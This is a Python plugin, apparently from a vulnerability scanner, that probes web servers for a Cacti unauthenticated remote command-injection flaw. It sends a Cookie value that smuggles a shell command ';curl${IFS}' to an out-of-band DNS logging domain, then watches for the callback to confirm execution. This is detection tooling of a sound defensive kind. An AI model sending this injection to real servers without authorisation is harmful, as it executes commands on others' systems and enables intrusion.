#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from urllib.parse import quote
from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if not conf.dnslog_enabled:
        return
    url = "{}://{}:{}".format(service, ip, port)
    domain = dns_monitor(ip, port).add_checker('cacti_unauthorized_rce',
                                               alert_group='Cacti Unauthorized Access RCE',
                                               details='Cacti未授权访问，通过该漏洞可在cacti服务器上执行命令')
    payload = ";curl${IFS}%s" % ('http' + domain)
    cookies = 'Cacti=' + quote(payload)

    target = url + "/graph_realtime.php?action=init"

    try:
        r = await http_client(ip, port).get(target, timeout=10)
        if r.status_code == 200 and "poller_realtime.php" in r.text:
            await http_client(ip, port).get(target, headers={'Cookie': cookies}, timeout=10)
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 80, 'http', True, task_msg={})
    run_plugin_test(scan)
